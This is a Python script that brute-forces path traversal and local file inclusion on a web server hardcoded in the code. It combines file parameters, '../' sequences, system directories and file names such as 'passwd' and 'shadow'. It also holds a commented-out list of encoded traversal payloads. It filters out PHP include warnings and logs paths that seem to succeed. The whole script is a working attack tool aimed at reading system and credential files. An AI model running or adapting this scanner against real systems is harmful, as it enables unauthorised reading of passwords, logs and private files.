import re
import argparse
import sys
import requests
from http.cookies import SimpleCookie
import time

a = 0

stuff = [
    "",
    "backup/",
    "services/",
    "database/",
    # "db/",
    # "backup-db/",
    "etc/",
    "var/",
    "var/log/",
    "var/www/files/",
]
tecicky = [
    "",
    "../",
    "../../",
    "../../../",
    "../../../../",
]
files = [
    # "",
    "?file=",
    "get-files",
    "get-files?",
    "file:",
    "index.php?p=",
    "get-files?file=",

]
"""
dot_dot = [
    "",
    "etc",
    "/..",
    "....//",
    "//....",
    "%252e%252e%255c",
    "%2e%2e%5c",
    "..%255c",
    "..%5c",
    "%5c../",
    "/%5c..",
    "..\\",
    "%2e%2e%2f",
    "../",
    "../../",
    "../../../",
    "...\\",
    "..../",
    "....\\",
]
"""
words = [
    "",
    "services",
    "functions",
    "default",
    "backup",
    "users",
    "connect",
    "shadow",
    "security",
    "comment",
    "passwd",
    "group",
    "index",
    "manage",
    "admin",
    "login",
    "homes",
    "dashboard",
    "delete",
    "update",
    "remove",
    "access",
    "apache",
    "apache2",
    "logs",
]
suffix = [
    "",
    ".py",
    ".php",
    ".html",
    ".js",
    ".txt",
    ".sql",
    ".log",
    ".png",
    ".jpg",


]


def count_searched():
    global a
    a += 1
    if a % 200 == 0:
        print("searching...    (" + str(a) + " searched)")


# Compare warning messages to content
def false_positives(end, content):
    warning_message = False
    too_long = False
    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
    if len(content) > 1500000:
        too_long = True
        print(end + " dlouhe")
    if warning1 in content or warning2 in content:
        warning_message = True
    if warning_message == False and too_long == False:
        return False
    else:
        return True


# Compare content with normal website content
def not_normal(content, normal_content):
    if content != normal_content:
        return True
    else:
        return False


# trim the normal website content
def content_adjustment(cur_content, norm_content):
    if norm_content in cur_content:
        shortened_content = cur_content.replace(norm_content, "\nNormal website content\nSHORTENED")
        return shortened_content
    else:
        return cur_content


def try_path(url, path, end):
    full_content = ""
    shortened_content = ""
    headers = ""
    full_url = url + path
    try:
        request = requests.get(full_url)
        normal_content = normal_con(url)
        status = request.status_code
        if status != 400 and status != 404 and status != 500:
            # False positive tests
            # Isn't normal website content
            if not_normal(request.text, normal_content):
                # Isn't error message
                print(full_url)
                if false_positives(end, request.text) == False:
                    # isn't already found path (to be written).......................
                    if "already_found" == "already_found":
                        # all tests passed
                        print("\n" + full_url)
                        print("[+] Status Code: " + str(status))
                        for item, value in request.headers.items():
                            headers += "\n" + item + value
                        # print("[+] Headers:" + headers)
                        # Get rid of normal website content
                        # content_body = content_adjustment(request.text, normal_content)
                        # print("\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                        try:
                            f = open("log_file.txt", "a")
                            # f.write("\n----------------------------------------------------------------------------------------------")
                            f.write("\n" + full_url)
                            # f.write("\n----------------------------------------------------------------------------------------------")
                            # f.write("\n[+] Status Code: " + str(status) + "\n[+] Headers:" + headers +
                            #         "\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                            f.close()
                        except:
                            print("\n" + full_url)
                            print("Problem with file")
        request.close()
    except:
        print("\n" + full_url)
        print("URL problem")


def try_all(url):
    for file in files:
        for dot in tecicky:
            for stu in stuff:
                for word in words:
                    for suf in suffix:
                        count_searched()
                        cur_path = file + dot + stu + word + suf
                        cur_end = dot + stu + word + suf
                        try_path(url, cur_path, cur_end)


def normal_con(url):
    content = requests.get(url)
    return content.text


if __name__ == '__main__':
    f = open("log_file.txt", "w")
    url = 'http://apache1.willilazarov.cz/'
    try_all(url)
